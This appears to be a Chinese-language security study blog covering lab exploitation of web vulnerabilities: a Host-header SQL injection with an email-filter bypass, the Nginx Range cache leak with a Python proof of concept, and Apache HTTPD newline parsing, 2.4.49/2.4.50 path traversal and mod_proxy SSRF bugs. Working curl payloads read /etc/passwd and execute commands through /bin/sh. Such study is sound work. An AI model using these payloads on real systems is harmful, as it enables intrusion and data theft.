<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">actionRegister</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>) &#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">arg</span>(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">arg</span>(<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$username</span>) || <span class="keyword">empty</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Username or password is empty.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$email</span> = <span class="title function_ invoke__">arg</span>(<span class="string">&#x27;email&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$email</span>)) &#123;</span><br><span class="line">            <span class="variable">$email</span> = <span class="variable">$username</span> . <span class="string">&#x27;@&#x27;</span> . <span class="title function_ invoke__">arg</span>(<span class="string">&#x27;HTTP_HOST&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$email</span>, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Email error.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT * FROM `<span class="subst">&#123;$user-&gt;table_name&#125;</span>` WHERE `username` = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$data</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;This username is exists.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ret</span> = <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">create</span>([</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span> =&gt; <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>),</span><br><span class="line">            <span class="string">&#x27;email&#x27;</span> =&gt; <span class="variable">$email</span></span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$ret</span>) &#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>] = <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">lastInsertId</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Unknown error.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>网站域名是从 <code>arg('HTTP_HOST')</code>  中获取，也就是从 <code>$_REQUEST</code>  或 <code>$_SERVER</code>  中获取。因为 <code>$_SERVER</code>  没有经过转义，我们只需要在 HTTP 头 Host 值中引入单引号，即可造成一个 SQL 注入漏洞。</p>
<p>但 email 变量经过了 <code>filter_var($email, FILTER_VALIDATE_EMAIL)</code>  的检测，我们首先要绕过之。</p>
<h3 id="filter_validate_email绕过"><a class="markdownIt-Anchor" href="#filter_validate_email绕过">#</a>  <code>FILTER_VALIDATE_EMAIL</code>  绕过</h3>
<p>RFC 3696 规定，邮箱地址分为 local part 和 domain part 两部分。local part 中包含特殊字符，需要如下处理：</p>
<ol>
<li>将特殊字符用 <code>\</code>  转义，如 <code>Joe\'Blow@example.com</code></li>
<li>或将 local part 包裹在双引号中，如 <code>&quot;Joe'Blow&quot;@example.com</code></li>
<li>local part 长度不超过 64 个字符</li>
</ol>
<p>虽然 PHP 没有完全按照 RFC 3696 进行检测，但支持上述第 2 种写法。所以，我们可以利用之绕过 <code>FILTER_VALIDATE_EMAIL</code>  的检测。</p>
<p>因为代码中邮箱是用户名、@、Host 三者拼接而成，但用户名是经过了转义的，所以单引号只能放在 Host 中。我们可以传入用户名为 <code>&quot;</code> ，Host 为 <code>aaa'&quot;@example.com</code> ，最后拼接出来的邮箱为 <code>&quot;@aaa'&quot;@example.com</code> 。</p>
<p>这个邮箱包含单引号，将闭合 SQL 语句中原本的单引号，造成 SQL 注入漏洞。</p>
<h3 id="绕过nginx-host限制"><a class="markdownIt-Anchor" href="#绕过nginx-host限制">#</a> 绕过 Nginx Host 限制</h3>
<p>我们尝试向目标注册页面发送刚才构造好的用户名和 Host：</p>
<p>直接显示 404，似乎并没有进入 PHP 的处理过程。</p>
<p>众所周知，如果我们在浏览器里输入 <code>http://2023.mhz.pw</code> ，浏览器将先请求 DNS 服务器，获取到目标服务器的 IP 地址，之后的 TCP 通信将和域名没有关系。那么，如果一个服务器上有多个网站，那么 Nginx 在接收到 HTTP 包后，将如何区分？</p>
<p>这就是 Host 的作用：用来区分用户访问的究竟是哪个网站（在 Nginx 中就是 Server 块）。</p>
<p>如果 Nginx 发现我们传入的 Host 找不到对应的 Server 块，将会发送给默认的 Server 块，也就是我们通过 IP 地址直接访问的那个 Nginx 默认页面：</p>
<p>默认网站并没有 <code>/main/register</code>  这个请求的处理方法，所以自然会返回 404。</p>
<h3 id="第一种处理方法"><a class="markdownIt-Anchor" href="#第一种处理方法">#</a> 第一种处理方法</h3>
<p>Nginx 在处理 Host 的时候，会将 Host 用冒号分割成 hostname 和 port，port 部分被丢弃。所以，我们可以设置 Host 的值为 <code>2023.mhz.pw:xxx'&quot;@example.com</code> ，这样就能访问到目标 Server 块：</p>
<h3 id="第二种处理方法"><a class="markdownIt-Anchor" href="#第二种处理方法">#</a> 第二种处理方法</h3>
<p>当我们传入两个 Host 头的时候，Nginx 将以第一个为准，而 PHP-FPM 将以第二个为准。</p>
<p>也就是说，如果我传入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Host: 2023.mhz.pw</span><br><span class="line">Host: xxx&#x27;&quot;@example.com</span><br></pre></td></tr></table></figure>
<p>Nginx 将认为 Host 为 <code>2023.mhz.pw</code> ，并交给目标 Server 块处理；但 PHP 中使用 <code>$_SERVER['HTTP_HOST']</code>  取到的值却是 <code>xxx'&quot;@example.com</code> 。这样也可以绕过：</p>
<h3 id="第三种处理方法"><a class="markdownIt-Anchor" href="#第三种处理方法">#</a> 第三种处理方法</h3>
<p>其实原理就是，我们在发送 https 数据包的时候，<span class="exturl" data-url="aHR0cDovL3huLS1TTklleGFtcGxlMi0yMThxNjQyZGd0bWp0bjkyMmF0aGxmdTVlLmNvbQ==">SNI 中指定的域名是 example2.com</span>，而无需和 HTTP 报文中的 Host 头保持一致，Nginx 会选择 SNI 中的域名作为 Server Name。</p>
<p>但此时我们在 Burpsuite 里修改协议为 https，并指定好 https 的 Host，也就是 SNI，如图 4。我们再修改 HTTP 数据包的 Host 头，就能正常访问目标后端了，</p>
<h3 id="mysql-57-insert注入方法"><a class="markdownIt-Anchor" href="#mysql-57-insert注入方法">#</a> Mysql 5.7 INSERT 注入方法</h3>
<p>既然已经触发了 SQL 报错，说明 SQL 注入近在眼前。通过阅读源码中包含的 SQL 结构，我们知道 flag 在 flags 表中</p>
<p>因为用户成功登录后，将会显示出该用户的邮箱地址，所以我们可以将数据插入到这个位置。发送如下数据包：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /main/register HTTP/1.1</span><br><span class="line">Host: 2023.mhz.pw</span><br><span class="line">Host: &#x27;),(&#x27;t123&#x27;,md5(12123),(select(flag)from(flags)))#&quot;@a.com</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=--------356678531</span><br><span class="line">Content-Length: 176</span><br><span class="line"></span><br><span class="line">----------356678531</span><br><span class="line">Content-Disposition: form-data; name=&quot;username&quot;</span><br><span class="line"></span><br><span class="line">&quot;a</span><br><span class="line">----------356678531</span><br><span class="line">Content-Disposition: form-data; name=&quot;password&quot;</span><br><span class="line"></span><br><span class="line">aaa</span><br><span class="line">----------356678531--</span><br></pre></td></tr></table></figure>
<p>可见，我闭合了 INSERT 语句，并插入了一个新用户 <code>t123</code> ，并将 flag 读取到 email 字段。登录该用户，获取 flag：</p>
<h3 id="报错注入"><a class="markdownIt-Anchor" href="#报错注入">#</a> 报错注入</h3>
<p>这里有两个需要绕过的坑：</p>
<ol>
<li>由于邮箱的限制，注入语句长度需要小于 64 位</li>
<li>Mysql 5.7 默认开启严格模式，部分字符串连接语法将导致错误： <code>ErrorInfo: Truncated incorrect INTEGER value</code></li>
</ol>
<p>我们可以不使用字符串连接语法，而使用 <code>&lt;</code> 、 <code>&gt;</code> 、 <code>=</code>  等比较符号来触发漏洞：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230716193923972.png" alt="image-20230716193923972"></p>
<h2 id="nginx越界读取"><a class="markdownIt-Anchor" href="#nginx越界读取">#</a> nginx 越界读取</h2>
<p>Nginx 在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括 “文件头”+“HTTP 返回包头”+“HTTP 返回包体”。如果二次请求命中了该缓存文件，则 Nginx 会直接将该文件中的 “HTTP 返回包体” 返回给用户。</p>
<p>range：</p>
<p>存在于 HTTP 请求头中，表示请求目标资源的部分内容，例如请求一个图片的前半部分，单位是 byte，原则上从 0 开始，但今天介绍的是可以设置为负数。<br>
range 的典型应用场景例如：断点续传、分批请求资源。<br>
range 在 HTTP 头中的表达方式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Range:bytes=0-1024 表示访问第0到第1024字节；</span><br><span class="line">Range:bytes=100-200,601-999,-300 表示分三块访问，分别是100到200字节，601到600字节，最后的300字节；</span><br><span class="line">Range:-100 表示访问最后的100个字节</span><br></pre></td></tr></table></figure>
<p>range 在 HTTP Response 表示：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Accept-Ranges:bytes 表示接受部分资源的请求；</span><br><span class="line">Content-Range: bytes START-END/SIZE  START-END表示资源的开始和结束位置，SIZE表示资源的的长度</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230716195414642.png" alt="image-20230716195414642"></p>
<p>当请求服务器的资源时，如果在缓存服务器中存在，则直接返回，不在访问应用服务器，可以降低应用服务器的负载。<br>
例如网站的首页的缓存，nginx 的默认缓存路径在 /tmp/nginx 下，例如：当请求服务器的资源时，如果在缓存服务器中存在，则直接返回，不在访问应用服务器，可以降低应用服务器的负载。<br>
例如网站的首页的缓存，nginx 的默认缓存路径在 /tmp/nginx 下，例如：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230716195429684.png" alt="image-20230716195429684"></p>
<p>再次访问该页面时会首先读取该缓存内容，其他的静态资源，例如：图片、CSS、JS 等都会被缓存。</p>
<p>1、现在我要读取刚才讲到的缓存文件头，他的 Content-Length 时 612，那么我读取正常缓存文件的 range 是设置为</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Range</span><span class="punctuation">: </span>bytes=0-612</span><br></pre></td></tr></table></figure>
<p>使用 curl 工具测试下，命令如下，执行后发现，返回的内容是正常的。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i http://127.0.0.1:8080 -r 0-612</span><br></pre></td></tr></table></figure>
<p>2、接下来要读取缓存头，读取前面 600 个字节，也就是</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">range=content_length + 偏移长度</span><br><span class="line">即：</span><br><span class="line">range = 612 + 600</span><br><span class="line">取负值为-1212</span><br></pre></td></tr></table></figure>
<p>此时知道 range 的 start 是 - 1212，那么 end 呢？nginx 的源码在声明 start,end 时用的是 64 位有符号整型，所以最大可表示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-2^63-2^63-1</span><br><span class="line">也就是</span><br><span class="line">-9223372036854775808 到 9223372036854775807</span><br></pre></td></tr></table></figure>
<p>所以只要 start+end 为 9223372036854775807 即可，故：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">end = 9223372036854775808 - 1212</span><br><span class="line">取负</span><br><span class="line">为-9223372036854774596</span><br></pre></td></tr></table></figure>
<p>执行结果为下图，可以发现读取到了缓存文件头，里面的 8081 端口在实际的业务场景中可能是其他的地址，这样便会造成信息泄漏。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230716195549010.png" alt="image-20230716195549010"></p>
<p>如果我的请求中包含 Range 头，Nginx 将会根据我指定的 start 和 end 位置，返回指定长度的内容。而如果我构造了两个负的位置，如 (-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于 “HTTP 返回包体” 前的 “文件头”、“HTTP 返回包头” 等内容。</p>
<p>访问 <code>http://your-ip:8080/</code> ，即可查看到 Nginx 默认页面，这个页面实际上是反向代理的 8081 端口的内容。</p>
<p>调用 <code>python3 poc.py http://your-ip:8080/</code> ，读取返回结果：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230716195207093.png" alt="image-20230716195207093"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &lt; 2:</span><br><span class="line">    print(&quot;%s url&quot; % (sys.argv[0]))</span><br><span class="line">    print(&quot;eg: python %s http://your-ip:8080/ offset&quot; % (sys.argv[0]))</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">headers = &#123;&#125;</span><br><span class="line">offset = int(sys.argv[2])</span><br><span class="line">url = sys.argv[1]</span><br><span class="line"></span><br><span class="line">file_len = len(requests.get(url, headers=headers).content)</span><br><span class="line">n = file_len + offset</span><br><span class="line"></span><br><span class="line">headers[&#x27;Range&#x27;] = &quot;bytes=-%d,-%d&quot; % (</span><br><span class="line">    n, 0x8000000000000000 - n)</span><br><span class="line"></span><br><span class="line">r = requests.get(url, headers=headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<h1 id="apach漏洞"><a class="markdownIt-Anchor" href="#apach漏洞">#</a> apach 漏洞</h1>
<h2 id="apache-httpd-换行解析漏洞"><a class="markdownIt-Anchor" href="#apache-httpd-换行解析漏洞">#</a> Apache HTTPD 换行解析漏洞</h2>
<p>Apache HTTPD 是一款 HTTP 服务器，它可以通过 mod_php 来运行 PHP 网页。其 2.4.0~2.4.29 版本中存在一个解析漏洞，在解析 PHP 时， <code>1.php\x0A</code>  将被按照 PHP 后缀进行解析，导致绕过一些服务器的安全策略。</p>
<p>启动后 Apache 运行在 <code>http://your-ip:8080</code> 。</p>
<p>原理：禁止上传.php 后缀的文件，但是系统不认为 php\x0A 是非法后缀，可以上传。访问时访问.php%0A 即可</p>
<p>在 1.php 后面插入一个 <code>\x0A</code> （注意，不能是 <code>\x0D\x0A</code> ，只能是一个 <code>\x0A</code> ）：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1.png" alt="img"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/2.png" alt="img"></p>
<p>访问刚才上传的 <code>/1.php%0a</code> ，发现能够成功解析，但这个文件不是 php 后缀，说明目标存在解析漏洞：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/3.png" alt="img"></p>
<h2 id="http-server-2449路径穿越漏洞"><a class="markdownIt-Anchor" href="#http-server-2449路径穿越漏洞">#</a> HTTP Server 2.4.49 路径穿越漏洞</h2>
<p>在其 2.4.49 版本中，引入了一个路径穿越漏洞，满足下面两个条件的 Apache 服务器将会受到影响：</p>
<ul>
<li>版本等于 2.4.49</li>
<li>穿越的目录允许被访问，比如配置了 <code>&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</code> 。（默认情况下是不允许的）</li>
</ul>
<p>利用这个漏洞，可以读取位于 Apache 服务器 Web 目录以外的其他文件，或者读取 Web 目录中的脚本文件源码，或者在开启了 cgi 或 cgid 的服务器上执行任意命令。</p>
<p>环境启动后，访问 <code>http://your-ip:8080</code>  即可看到 Apache 默认的 <code>It works!</code>  页面。</p>
<p>使用如下 CURL 命令来发送 Payload（注意其中的 <code>/icons/</code>  必须是一个存在且可访问的目录）：(%2e%2e 是… 的 urlcode)</p>
<p>.%2e 不会被程序解析为… ，即可绕过… 的过滤。  .%2e 会被 url 解密成为路径穿越</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br></pre></td></tr></table></figure>
<p>在服务端开启了 cgi 或 cgid 这两个 mod 的情况下，这个路径穿越漏洞将可以执行任意命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --data &quot;echo;id&quot; &#x27;http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
<h2 id="apache-http-server-2450-路径穿越漏洞"><a class="markdownIt-Anchor" href="#apache-http-server-2450-路径穿越漏洞">#</a> Apache HTTP Server 2.4.50 路径穿越漏洞</h2>
<p>Apache 官方在 2.4.50 版本中对 2.4.49 版本中出现的目录穿越漏洞 CVE-2021-41773 进行了修复，但这个修复是不完整的，CVE-2021-42013 是对补丁的绕过。</p>
<p>攻击者利用这个漏洞，可以读取位于 Apache 服务器 Web 目录以外的其他文件，或者读取 Web 目录中的脚本文件源码，或者在开启了 cgi 或 cgid 的服务器上执行任意命令。</p>
<p>这个漏洞可以影响 Apache HTTP Server 2.4.49 以及 2.4.50 两个版本。</p>
<p>我们使用 CVE-2021-41773 中的 Payload 已经无法成功利用漏洞了，说明 2.4.50 进行了修复。</p>
<p>但我们可以使用 <code>.%%32%65</code>  进行绕过（注意其中的 <code>/icons/</code>  必须是一个存在且可访问的目录）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --path-as-is http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230719215750905.png" alt="image-20230719215750905"></p>
<p>在服务端开启了 cgi 或 cgid 这两个 mod 的情况下，这个路径穿越漏洞将可以执行任意命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --data &quot;echo;id&quot; &#x27;http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
<h2 id="apache-http-server-2448-mod_proxy-ssrf漏洞"><a class="markdownIt-Anchor" href="#apache-http-server-2448-mod_proxy-ssrf漏洞">#</a> Apache HTTP Server 2.4.48 mod_proxy SSRF 漏洞</h2>
<p>2.4.48 及以前的版本中，mod_proxy 模块存在一处逻辑错误导致攻击者可以控制反向代理服务器的地址，进而导致 SSRF 漏洞。</p>
<p>如果我们要部署一个 PHP 运行环境，且将 Apache 作为 Web 应用服务器，那么常用的有三种方法：</p>
<ol>
<li>Apache 以 CGI 的形式运行 PHP 脚本</li>
<li>PHP 以 mod_php 的方式作为 Apache 的一个模块运行</li>
<li>PHP 以 FPM 的方式运行为独立服务，Apache 使用 mod_proxy_fcgi 模块作为反代服务器将请求代理给 PHP-FPM</li>
</ol>
<p>第一种方式比较古老，性能较差，基本已经淘汰；第二种方式在 Apache 环境下使用较广，配置最为简单；第三种方法也有较大用户体量，不过 Apache 仅作为一个中间的反代服务器，更多新的用户会选择使用性能更好的 Nginx 替代。</p>
<p>这其中，第三种方法使用的 mod_proxy_fcgi 就是本文主角 mod_proxy 模块的一个子模块。mod_proxy 是 Apache 服务器中用于反代后端服务的一个模块，而它拥有数个不同功能的子模块，分别用于支持不同通信协议的后端，比如常见的有：</p>
<ul>
<li>mod_proxy_fcgi 用于反代后端是 fastcgi 协议的服务，比如 php-fpm</li>
<li>mod_proxy_http 用于反代后端是 http、https 协议的服务</li>
<li>mod_proxy_uwsgi 用于反代后端是 uwsgi 协议的服务，主要针对 uWSGI</li>
<li>mod_proxy_ajp 用于反代后端是 ajp 协议的服务，主要针对 Tomcat</li>
<li>mod_proxy_ftp 用于反代后端是 ftp 协议的服务</li>
</ul>
<p><strong>复现方法</strong>：当目标环境使用了 mod_proxy 做反向代理，比如 <code>ProxyPass / &quot;http://localhost:8000/&quot;</code> ，此时通过请求 <code>http://target/?unix:&#123;'A'*5000&#125;|http://example.com/</code>  即可向 <code>http://example.com</code>  发送请求，造成一个 SSRF 攻击。</p>
<p>这里面，Apache 代码中犯得错误是在 modules/proxy/proxy_util.c 的 fix_uds_filename 函数：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">fix_uds_filename</span><span class="params">(request_rec *r, <span class="type">char</span> **url)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *ptr, *ptr2;</span><br><span class="line">    <span class="keyword">if</span> (!r || !r-&gt;filename) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(r-&gt;filename, <span class="string">&quot;proxy:&quot;</span>, <span class="number">6</span>) &amp;&amp;</span><br><span class="line">            (ptr2 = <span class="built_in">ap_strcasestr</span>(r-&gt;filename, <span class="string">&quot;unix:&quot;</span>)) &amp;&amp;</span><br><span class="line">            (ptr = <span class="built_in">ap_strchr</span>(ptr2, <span class="string">&#x27;|&#x27;</span>))) &#123;                          <span class="comment">// 程序会判断前6个字符是否为proxy:，并且协议为unix: ， 有 |</span></span><br><span class="line">        <span class="type">apr_uri_t</span> urisock;</span><br><span class="line">        <span class="type">apr_status_t</span> rv;</span><br><span class="line">        *ptr = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        rv = <span class="built_in">apr_uri_parse</span>(r-&gt;pool, ptr2, &amp;urisock);</span><br><span class="line">        <span class="keyword">if</span> (rv == APR_SUCCESS) &#123;</span><br><span class="line">            <span class="type">char</span> *rurl = ptr+<span class="number">1</span>;           <span class="comment">//rurl是| 后面的部分的指针，即http://example.com/</span></span><br><span class="line">            <span class="type">char</span> *sockpath = <span class="built_in">ap_runtime_dir_relative</span>(r-&gt;pool, urisock.path);</span><br><span class="line">            <span class="built_in">apr_table_setn</span>(r-&gt;notes, <span class="string">&quot;uds_path&quot;</span>, sockpath);   <span class="comment">//uds+path是前面的socket部分unix:&#123;&#x27;A&#x27;*5000&#125;</span></span><br><span class="line">            *url = <span class="built_in">apr_pstrdup</span>(r-&gt;pool, rurl); <span class="comment">/* so we get the scheme for the uds */</span></span><br><span class="line">            <span class="comment">/* r-&gt;filename starts w/ &quot;proxy:&quot;, so add after that */</span></span><br><span class="line">            <span class="built_in">memmove</span>(r-&gt;filename+<span class="number">6</span>, rurl, <span class="built_in">strlen</span>(rurl)+<span class="number">1</span>);</span><br><span class="line">            <span class="built_in">ap_log_rerror</span>(APLOG_MARK, APLOG_TRACE2, <span class="number">0</span>, r,</span><br><span class="line">                    <span class="string">&quot;*: rewrite of url due to UDS(%s): %s (%s)&quot;</span>,</span><br><span class="line">                    sockpath, *url, r-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            *ptr = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Apache 在配置反代的后端服务器时，有两种情况：</p>
<ul>
<li>直接使用某个协议反代到某个 IP 和端口，比如 <code>ProxyPass / &quot;http://localhost:8080&quot;</code></li>
<li>使用某个协议反代到 unix 套接字，比如 <code>ProxyPass / &quot;unix:/var/run/www.sock|http://localhost:8080/&quot;</code></li>
</ul>
<p>第一种情况比较好理解，第二种情况的设计我觉得不是很好，相当于让用户可以使用一个 Apache 自创的写法来配置后端地址。那么这时候就会涉及到 parse 的过程，需要将这种自创的语法转换成能兼容正常 socket 连接的结构，而 fix_uds_filename 函数就是做这个事情的。</p>
<p>使用字符串文法来表示多种含义的方式通常暗藏一些漏洞，比如这里，进入这个 if 语句需要满足三个条件：</p>
<ul>
<li><code>r-&gt;filename</code>  的前 6 个字符等于 <code>proxy:</code></li>
<li><code>r-&gt;filename</code>  的字符串中含有关键字 <code>unix:</code></li>
<li><code>unix:</code>  关键字后的部分含有字符 <code>|</code></li>
</ul>
<p>当满足这三个条件后，将 <code>unix:</code>  后面的内容进行解析，设置成 <code>uds_path</code>  的值；将字符 <code>|</code>  后面的内容，设置成 <code>rurl</code>  的值。</p>
